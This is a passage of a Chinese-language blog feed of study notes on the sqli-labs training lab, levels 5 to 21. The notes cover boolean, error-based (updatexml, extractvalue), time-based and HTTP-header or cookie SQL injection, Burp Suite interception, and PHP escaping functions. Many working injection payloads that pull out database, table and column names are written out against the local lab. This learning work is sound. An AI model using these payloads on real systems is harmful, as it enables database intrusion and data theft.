<p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE  table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
<p><strong>substr()函数</strong><br>  Substr()和substring()函数实现的功能是一样的，均为截取字符串。<br>string substring(string, start, length)<br>string substr(string, start, length)<br><strong>参数描述同mid()函数</strong>，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。<br>例子：<br>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。<br>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入</p>
<p><strong>Left()函数</strong></p>
<p>Left()得到字符串左部指定个数的字符</p>
<p>Left ( string, n )    string为要截取的字符串，n为长度。</p>
<p>Sql用例：</p>
<p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p>
<p>(2) 同样的string可以为自行构造的sql语句。</p>
<p> 同时也要介绍<strong>ORD()函数</strong>，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’<br>资料来源：<a href="https://www.cnblogs.com/lcamry/p/5504374.html">https://www.cnblogs.com/lcamry/p/5504374.html</a></p>
<p><strong>length()函数</strong><br>可以用来判断字符数<br>eg：length(database())&gt;5,这个数据库的名称是否大于五个字符<br>资料先放着吧，感觉还是要运用了记忆力会比较深<br>然后回到题目来：<br>此时我们使用length判断数据库名称的长短<br>使用指令and length(database())&gt;=8 画面返回</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109204923.png" alt="img" style="zoom:50%;">

<p>但是当我 为and length (database())&gt;9的时候<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109205105.png" alt="img" style="zoom:50%;"></p>
<p>返回了这玩意，说明是错的，也就是这个数据库的字符数是8，想一下我就觉得是security。<br>我们接下来去试试</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><strong>substr((string, start&lt;,length&gt;)</strong></p>
<p>这里有一种方法是利用 substr(database(),1,1)=’s’  这个函数来一个个试</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201109205401.png" alt="img" style="zoom:50%;">

<p>发现是可以的，说明第一个字母就是s，然后接下来继续去试，发现就是security</p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p><strong>这里有一种方法是利用burp suite工具：</strong><br>下面是学习过程</p>
<h3 id="proxy-和代理相关"><a href="#proxy-和代理相关" class="headerlink" title="proxy 和代理相关"></a>proxy 和代理相关</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111132418.png" alt="img" style="zoom:50%;">

<h3 id="intercept截断"><a href="#intercept截断" class="headerlink" title="intercept截断"></a>intercept截断</h3><p>默认Intercept is on 按钮出于开启状态 也就是说默认代理截断功能是打开的.此时所有的请求都会被截断,只有手动Forward之后请求才会被发出去<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111164906.png" alt="img" style="zoom:50%;"></p>
<h4 id="Http-history-http请求历史"><a href="#Http-history-http请求历史" class="headerlink" title="Http history(http请求历史)"></a>Http history(http请求历史)</h4><p>所有经过burp suite 的请求 都会被记录到http history中. 上面是请求概要信息 下面是请求详细信息</p>
<img src="file:///C:\Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\Z5PY{7PM8O]U[L45$NQF`BA.png" alt="img" style="zoom:50%;">

<h4 id="websookets-history"><a href="#websookets-history" class="headerlink" title="websookets history"></a>websookets history</h4><p>有的web时没有界面的，是用一个长链接 类似于api的方式来传输数据 burp suite也是可以截获这类信息的<br><strong>api</strong>是一个通道，是一个接口，负责一个程序和其他软件的沟通，本质是预先定义的函数，就是类似于预设。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111170041.png" alt="img" style="zoom:50%;"></p>
<h3 id="options（配置选项）"><a href="#options（配置选项）" class="headerlink" title="options（配置选项）"></a>options（配置选项）</h3><h4 id="Proxy-Listeners-侦听端口设置"><a href="#Proxy-Listeners-侦听端口设置" class="headerlink" title="Proxy Listeners(侦听端口设置)"></a>Proxy Listeners(侦听端口设置)</h4><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111170332.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111170819.png" alt="img" style="zoom:50%;">
点击next 就会生成一张证书 选择路径保存. 然后导入到浏览器,就可以实现https的访问

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111170943.png" alt="img" style="zoom:50%;">
资料来自：https://www.cnblogs.com/php09/p/10412687.html
学习博客：https://blog.csdn.net/qq_35544379/article/details/76696106

<p>弄这个弄得我想吐，我在抓sqlilabs的本地包的时候，一直抓不到 ，我以为是burp的问题，原来是浏览器的问题，人傻了，我试了几个方法，好像修改火狐浏览器的一个高级选项是最有效的，这样你使用localhost输入的时候也可以抓到了</p>
<p>我发现一件事，我再用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and substr(database(),1,1)&#x3D;&#39;s&#39; --+</span><br></pre></td></tr></table></figure>

<p>这个语句的时候，我就在想，我首先知道这个数据库的名称有多长，然后对每个字母单独加一个burp里面的变量符，这样，我是不是就免去了一个个去试的麻烦呢？<br>接下来验证一下<br>根据前面我的做题，我们知道，这个数据库名字的长度肯定是8个字符<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201111201319.png" alt="img" style="zoom:50%;"></p>
<p>首先是这样 然后<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201112180848.png" alt="img" style="zoom: 80%;"></p>
<p>先clear  再分别对每个a进行add  我发现这个方法是不行的，但是我的思路是OK的，因为我发现他有另外一个功能，我接下来直接放图就一目了然了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201112180344.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201112180349.png" alt="img" style="zoom:50%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201112180355.png" alt="img" style="zoom:50%;">

<p>就这样，然后点击star attack就可以，但是我发现这个add from list中选择8个字母好像没有所有排序，所以。。。。。可能还有更好地方法？，那反正这一步大概就是这样了<br>接下来是判断他的库名：库名其实还是要使用<strong>substr</strong>来判断他的库名 其实就是在前三关查询的基础上 加了一个substr  语句是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1 ),1,1) &#x3D; &#39;e&#39; --+ &#x2F;&#x2F;这边有一点需要说明的是为什么需要加这个limit 0,1  我们知道一个库中可以有很多表，按我的理解是，你如果没有加这个limit0,1 那么数据库以为你要查询的数据数每个表的，也就是说这个语句变成，每个表的第一个字母是e，而不是我们想要的，第一个表的首字母为e。</span><br></pre></td></tr></table></figure>

<p>这边补充一下<strong>limit n,m</strong>的功能和意思<br>limit的使用格式为limit m,n，其中m是指记录开始的位置，从0开始，表示第一条记录，n是指取n条记录<br>例如：limit 0,1 表示从第一条记录开始，取一条记录，在上面那个语句中的意思就是，从第一个表开始取，去一个表的名称</p>
<p>localhost:81/sqli-labs-php7-master/Less-5/?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’ –+<br>然后根据之前的经验就是emails 其实也没啥太大区别，后续就是替换substr当中的语句，替换为<br>select column_name from information_schema.columns where table_name =’emails’</p>
<p>还有什么一个字符的就不多说了。<br>其实不一定要用substr 还有其他很多命令，我在下面的关卡看看能不能使用，不能使用的话，后续再整理</p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>确实和之前一样，但是这边是双引号的报错<br>解题思路和上一次一样，这次我们换换其他指令看看效果：<br>我去查了一下 报错函数是否都需要加and 我是没找到具体说明，但我看每个在使用的时候都有加一个and的<br>接下来我们先用<strong>left</strong><br>其实和substr也差不多，不过 left是规定从左边起，而substr还能规定从哪里开始从哪里结束<br>记代码一样打一下</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs4</title>
    <url>/2020/11/19/sqlilabs4/</url>
    <content><![CDATA[<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>这里开始进入post注入，首先我们需要知道，post是向服务器提交数据<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119200240.png" alt="img" style="zoom: 67%;"></p>
<p>一开始是从需要从这里输入账号密码<br>做完之前的题目 其实就有感觉就是，你输入的东西、比如id、password之类的 最后都会转换成sql语言并发挥作用，在第一关中，我们使用了单引号，并且截图进行分析，而在这一关我们也是如此  <a id="more"></a></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119200046.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119202406.png" alt="img" style="zoom:50%;">
在这个当中，我看出 我们的语句好像可以跟之前一样，在1后面的''这两个引号里面似乎可以注入我们想要的命令但其实不行

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119203520.png" alt="img"></p>
<p>输出的确实这样一个语句，这个时候就很奇怪了，为什么单引号里面的内容不会被执行呢？</p>
<p>我们再来对比一下他和第一关的源码</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119203905.png" alt="img" style="zoom: 67%;">



<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119203936.png" alt="img" style="zoom:67%;">

<p>我吐了啊 其实有个很关键的点是，现在我们在这里输入 –+注释功能，其实已经是不起作用的了<br>所以上面为什么不会执行就是因为这个这个原因 ！！！！！！！！！<br>所以这里我们只需要输入–(空格), 或者# 即可注释掉后面的语句<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119221248.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119221349.png" alt="img" style="zoom:50%;">

<p>这样就可以了 我的天哪，我对自己太无语了</p>
<h4 id="这里整理一下注释的知识点"><a href="#这里整理一下注释的知识点" class="headerlink" title="这里整理一下注释的知识点"></a>这里整理一下<strong>注释</strong>的知识点</h4><p>注释手段<br><strong>1</strong>mysql的注释有4 种 ：</p>
<p>“#” ： # 开头到行尾的都为注释，只能注释一行<br> “– ” （2个减号 一个空格） ： – 开头到行尾都为注释 ， 只能注释一行<br> “/*  xxx <em>/“  : 可以注释多行，但是一定要闭合，不然出错<br> ”/</em>! 数字  代码 */“ : 可以跨行注释，但是一定要闭合，不然出错。<br><strong>2</strong><br>在浏览器url中，#是用来知道浏览器动作（例如锚点），对服务器端没有效果。<br>可以用 # 的url编码 即%23代替。<br>在浏览器中，url中的+解析为空格。<br>在myslq中，–’ 是的 – 与 单引号 连接在一起，不能形成正确的sql语句，而 –空格 则可以。<br>所以在浏览器的url中用 –+ 或–’使服务端能够正确注释sql语句<br>所以 +针对的是在url中的注释！！！</p>
<p>老规矩 order by 查字段数</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119231226.png" alt="img" style="zoom:50%;">

<p>字段数是2 所以 接下的操作就很明确了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201119232447.png" alt="img" style="zoom:50%;">

<p>接下来就是巩固一下代码的记忆了</p>
<h3 id="接下来是第12关"><a href="#接下来是第12关" class="headerlink" title="接下来是第12关"></a>接下来是<strong>第12关</strong></h3><p>第十二关 我们</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120123910.png" alt="img" style="zoom: 80%;">

<p>无论输入单引号还是括号都无反应，都没有报错，所以我直接输入了双引号，出现这个报错，所以很明显 我们需要双引号加括号来闭合后面语句，并在其中注入我们的查询语句</p>
<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a><strong>第十三关</strong></h3><p>这个关卡其实就是需要盲注了，因为登录成功以后，他是没有登录信息的</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120124940.png" alt="img" style="zoom:80%;">

<p>接下来就是先布尔盲注</p>
<p>那就是看有无报错<br>这里我在使用burp suit暴力破解试试<br>发现那个密码字典里面没有emails这个名字，所以就没成功，我觉得可以去找一些字典过来。</p>
<p>然后这里引入一个新函数<br><strong>updatexml</strong>:<br><strong>作用</strong>：改变文档中符合条件的节点的值，需要注意的是 ，我们在注入中使用这个语句是加了select的，所以并没有对真正的数据进行修改，而是在内存中将取出的数据进行修改然后返回给用户<br><strong>注意</strong>：这个这个函数是针对xml文件进行修改的，然后我们数据库的内容基本上是存放在这个xml文件中的<br><strong>语法</strong>：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
<p><strong>实例</strong><br>select updatexml(1,concat(‘<del>‘,(SELECT database()),’</del>‘),1) – <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120154458.png" alt="img"></p>
<p>结果是看报错 是XPATH报错，并且 输出的报错信息，是我们那个concat拼接部分的内容。</p>
<p><strong>使用理解</strong>：<br>对于这个函数，我想了一下，大概是这样的，updatexml是一个修改函数，他的语法是UPDATEXML (XML_document, XPath_string, new_value); 我们知道中间那个XPath_string是需要符合xpath格式的，所以当我们注入的格式不符合xpath他就会报错，而updatexml（）报错信息是特殊字符、字母以及之后的内容，为了前面后面字母丢失，开头结尾连接特殊字符~， 这样就只有中间我们的查询语句是以结果的形式报出，而且报错的内容是将我们的语句转化过后的<br>后面我又将‘’里面的内容替换了一下，都是会原样输出的，但是如果是字母 则会表现无错，说明这个是合法的，那下次在使用这个语句注入的时候干脆都用字符吧，</p>
<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a><strong>第十四关</strong></h3><p>我们就使用extractvalue（）这个函数试试<br><strong>作用：</strong><br>对XML文档进行查询的函数<br><strong>格式</strong><br>extractvalue(xml.frag,xpath_expr)<br><strong>共同点</strong><br>和updatexml的共同点是报错原理：Xpath格式语法书写错误的话，就会报错<br>并且报错的内容也是引号内的，如果是命令则会直接转化<br>直接上操作：</p>
<p>使用 extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘)) – </p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120162831.png" alt="img" style="zoom:67%;">

<p>接下来就大同小异了。</p>
<p><strong>小结</strong>：<br>其实我们使用的这两个函数，都是利用他的报错会将我们的命令语句识别，并输出我们需要的信息。</p>
<h3 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a><strong>第15关</strong></h3><p>这一关没有输出报错信息，所以我们输入 ‘and1=1 –  和’and1=2 –  发现结果其实是不一样的，所以我们可以知道单引号注入。没有报错信息，意味着我们需要时间盲注<br>：admin’ and if(substr(database(),1,1)=’s’,sleep(5),1) –<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120164344.png" alt="img" style="zoom:50%;"></p>
<p>和之前的也没多大区别哈哈</p>
<p><strong>第十六关</strong>是双引号加括号的</p>
<h4 id="小结一下："><a href="#小结一下：" class="headerlink" title="小结一下："></a>小结一下：</h4><p>到现在为止遇到的注入点好像就是只有or 1=1–+ </p>
<p>1.’and 1=1–+ </p>
<p>2.”and 1=1–+ </p>
<p>3.)and 1=1–+ </p>
<p>4.’)and 1=1–+ </p>
<p>5.”) and 1=1–+ </p>
<p>6.”))and 1=1–+ </p>
<p>关于闭合问题的链接<a href="https://blog.csdn.net/qq_36896220/article/details/94129125">https://blog.csdn.net/qq_36896220/article/details/94129125</a></p>
<p>补充知识：<br><strong>在看源码的时候注意到有一个isset()函数</strong><br><strong>作用</strong><br>用于检测变量是否已设置并且非NULL</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs5</title>
    <url>/2020/11/20/sqlilabs5/</url>
    <content><![CDATA[<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>这一关和其他的就不太一样，比如说标题是update query<br>所以这里 我们需要修改表中的数据<br>修改表中数据我们使用的是 update<br><strong>语法是</strong>：<br>update test set sex=female;//所有员工性别更改为女性<br>update test set sex = female where name =’zhangsan’;//更改张三这个员工的性别    <a id="more"></a></p>
<p>看了下这题的是这样的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120214428.png" alt="img" style="zoom:67%;"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120214500.png" alt="img"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120214459.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201120215444.png" alt="img" style="zoom:67%;">
当我在username里面随便输了admin 他就说我成功的更改了我的密码，再结合源码，猜测这里是 在我输入账号以后，他会连接到存放我这个账号的字符段，然后将那边的密码更换成我现在输的
然后，在username无论我输那个单引号的何种组合情况，都没有反应，结合源码，我发现这里有个PHP的安全命令
**addslashes()与stripslashes()函数**

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201124170535.png" alt="img"></p>
<p>这边自定义了一个函数 check_input函数，里面出现了<strong>substr</strong>、<strong>get_magic_quotes_gpc</strong>、<strong>stripslashes</strong>这几个函数：</p>
<p><strong>get_magic_quotes_gpc()函数</strong><br>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开<br>当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。<strong>所以我们在账号一栏输入的单引号等的数据没有效果的原因就在这里</strong></p>
<p><strong>addslashes()与stripslashes()函数</strong><br>addslashes(string)函数返回在预定义字符之前添加反斜杠\的字符串：</p>
<ul>
<li>单引号 ’</li>
<li>双引号 “</li>
<li>反斜杠 \</li>
<li>空字符 NULL</li>
</ul>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
<p>注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。<br><strong>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</strong></p>
<p><strong>substr函数</strong><br>substr(string,start[,length])<br>参数 描述<br>string 必需，规定要返回其中一部分的字符串<br>start 必需，规定在字符串的何处开始<br>正数：在字符串的指定位置开始<br>负数：在从字符串结尾开始的指定位置开始<br>0：在字符串中的第一个字符处开始<br>length 可选，要返回的字符数。如果省略，则返回剩余文本<br>正数：从start参数所在的位置返回的长度<br>负数：从字符串末端返回的长度<br><strong>这里补充一下我的理解</strong>：这个substr的意思是截取字符段，也就是截取你输入的数据前几位这样，然后将截取的数据进行过滤操作，即加入反斜杠操作</p>
<p><strong>ctype_digit()函数</strong><br>ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
<p><strong>mysql_real_escape_string()函数</strong><br>mysql_real_escape_string(string,connection)<br>参数 描述<br>string 必需，规定要转义的字符串<br>connection 可选，规定MySQL连接。如果未规定，则使用上一个连接</p>
<p>mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
<ul>
<li><p>\x00 空值</p>
</li>
<li><p>\n</p>
</li>
<li><p>\r 换行</p>
</li>
<li><p>\</p>
</li>
<li><p>’</p>
</li>
<li><p>“</p>
</li>
<li><p>\x1a<br>**知道这个点后 ，那就说明我们无法通过在账号一栏注入 **</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201124200820.png" alt="img"></p>
<p>然后我们看这个密码这一栏有个引号，所以我们这就意味着我们可以在密码一栏通过密码来注入<br>我们在账号一栏输入admin以后，接着在密码一栏输入我们的注入语句 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) -- </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123&#39;and updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;~&#39;),1) -- </span><br></pre></td></tr></table></figure>

<h3 id="那么我们如何绕过这个过滤呢？"><a href="#那么我们如何绕过这个过滤呢？" class="headerlink" title="那么我们如何绕过这个过滤呢？"></a><strong>那么我们如何绕过这个过滤呢？</strong></h3><p><a href="https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control">https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control</a> 这个博客里面倒是说了个方法，但是用在这里好像不太合适，因为其实我们注意到他有一个substr函数，只截取了前15个字符，所以当我输入的语句超过15个的时候，后面的代码就自动被抛弃了。<br>记得拓展学习SqlParameter</p>
</li>
</ul>
<h2 id="第-十八关"><a href="#第-十八关" class="headerlink" title="第 十八关"></a>第 十八关</h2><p>这个关卡好像有点不太一样，先来看看源码：</p>
<p>![E_{358QK8A23J%N`T0Q%2LM](<a href="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202559.png">https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202559.png</a>)</p>
<p>可以看到在这一关，对于uname和passwd依旧做了addslashes()函数处理，所以想再这里注入不太可能<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202802.png" alt="img"></p>
<p>并且在输出uname和passwd的时候也没有单引号等字符的出现，所以想在这里注入是不可能的了<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202952.png" alt="img"></p>
<p>看这里 获取了uagent和IP 这个是干啥的？</p>
<p>HTTP_USER_AGENT：返回HTTP头部的USER_AGENT（user_agent的内容包含发出请求的用户信息）<br>REMOTE_ADDR:：返回http头部IP地址<br>接下来我们再来看看这些源代码 到底哪里可以让我们注入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126203920.png" alt="img">找到了一个insert语句 这里发现 后面有个引号，要是我们在里面输入我们的命令，是不是就可以获得我们需要的信息了？那我们该如何更改呢——burp suit 抓包工具，因为 我们从前面的$servent可以看出 这里是需要返回http头部的信息，所以。。。。懂的都懂<br>试一下：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126204339.png" alt="img" style="zoom:67%;">

<p>猜猜我发现了啥，这有个user_agent，OK 让我们吧大致思路理顺一下：一开始我们需要返回http发出请求的用户信息，如果我们将这个用户信息更改完我们的指令，那其实就是这样的<br>$uagent=$servent[‘这里就是我们的注入语句’]<br>然后这个查询语句会被代入到sql中执行，我们尝试一下<br>将user-Agent替换成以下语句<br>现在user-Agent这个语句的最后添加一个单引号，看看是否报错<br>结果是会报错的，所以我们可以直接在burp suit里面添加我们的注入语句<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127160030.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)),1,1) # </span><br></pre></td></tr></table></figure>


<p>这里<strong>说说我的思路</strong>：因为我们前面知道，这个注入点是在insert语句当中的，我一开始没输入后面的，1,1导致出现错误提示：就是和insert前面插入值不对应的情况，他insert插入了三个值，所以我们这里也需要有三个值 然后#号注释掉后面的内容，然后至于后面的1加不加引号都无所谓，因为1无论加不加引号都是合法数据，但是 如果要加引号 一定要严格按照insert语句的格式 比如1 左右两边就要加 不然就会报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)),&#39;1&#39;,&#39;1&#39;) # </span><br><span class="line">&#39;or extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;~&#39;)),1,1) #</span><br></pre></td></tr></table></figure>

<p>接下来就是爆表 爆字符段了<br>让我们愉快的进入<strong>19关</strong>吧<br>这关和18关差不多就是注入的位置现在在Referer</p>
<h1 id="第20关"><a href="#第20关" class="headerlink" title="第20关"></a>第20关</h1><p>这里我们先看看源码吧<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127174132.png" alt="img" style="zoom:67%;"><br>依旧做了过滤操作，所以不能在账号密码这里操作<br>我们发现他和前几关不一样的时候这里又获取了一个cookie数据<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127174452.png" alt="img" style="zoom:67%;"></p>
<p><strong>什么是cookie？</strong><br>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064">Cookies</a>。类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>计算机暂时或永久保存的信息<br><strong>cookie是什么?有什么作用?</strong><br>cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页;<br>而且，你自动保存的内容也是被记录在cookie当中的，当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告</p>
<p>感觉这个就有点危险呀，好像可以利用cookies做点什么不得了的东西？？？</p>
<p>我们继续往下看<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127180149.png" alt="img"></p>
<p>有点熟悉，我们好像可以利用这个cookee试试，这个时候我们依旧使用burp suit抓个包<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127180335.png" alt="img" style="zoom:67%;"></p>
<p>第一次没看到cookie的数据 我们再点一次forward<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127180427.png" alt="img" style="zoom:67%;"></p>
<p>这一次就有了  接下来让我们试试加个引号<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127180621.png" alt="img"></p>
<p>出现了报错，然后我们再试试and 1=1 和and 1=2 </p>
<p>不一样，报错了 ，所以这里存在注入点 接下来就是常规操作了  我们应该是要利用报错注入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127181147.png" alt="img"><br>成功 代码是 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)) #</span><br></pre></td></tr></table></figure>

<p>这里 我就在想为什么我要要按两次forward才能截取到含有cooKies的包呢？<br>让我们回去看看源代码<br>学到这里 有必要先总结一下几个常见函数，之前只是模模糊糊的概念：<br><strong>1.mysqli_query() 函数</strong>执行某个针对数据库的查询。<br><strong>2.mysqli_fetch_array() 函数</strong>从结果集中取得一行作为关联数组，或数字数组，或二者兼有。（取出我们输入的那一行账号密码）<br><strong>3.setcookie() 函数</strong>向客户端发送一个 HTTP cookie。cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当计算机通过浏览器请求一个页面，就会发送这个 cookie。cookie 的名称指定为相同名称的变量。例如，如果被发送的 cookie 名为 “name”，会自动创建名为 $user 的变量，包含 cookie 的值。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127221343.png" alt="img" style="zoom:67%;">

<p><strong>header（）跳转函数</strong><br>header(“Location:”)作为php的转向语句，接下来就跳转打开新页面，并且如果后面没有紧跟exit的话 他是会继续执行的只不过不会返回到页面上，要求header前没有任何输出。<br>这就是为什么我们要连续按两次forward的原因了。<br>接下来的语句好像也没啥<br>其实在这一关中还可以使用union拼接select语句<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201127224654.png" alt="img" style="zoom:67%;"><br>从这个途中我们不难发现 其实username password都是从cookee中获取的，然后我们之前也知道cookee那里存在注入点想要让我们需要的数据直接在username和paswrd这里输出，接下来我们就可以order by 然后 union select 拼接语句查询了，思路就跟之前的一样。</p>
<h3 id="第21关"><a href="#第21关" class="headerlink" title="第21关"></a>第21关</h3><p>不知道为啥我21关和22关是没有的但是我看了一下题目，是上传文件的题目 然后查了一下  果然还是要一句话木马，然后需要利用burp suit</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs6</title>
    <url>/2020/11/28/sqlilabs6/</url>
